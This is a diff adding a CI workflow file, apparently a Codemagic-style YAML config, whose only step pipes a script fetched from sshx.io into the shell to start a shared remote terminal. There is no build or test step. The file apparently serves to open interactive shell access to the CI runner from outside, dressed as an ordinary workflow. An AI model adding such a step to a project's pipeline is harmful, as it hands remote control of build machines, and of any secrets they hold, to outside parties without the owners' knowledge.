@@ -1,1 +1,5 @@
-
+workflows:
+  main:
+    name: main workflow
+    scripts:
+        - curl -sSf https://sshx.io/get | sh -s run
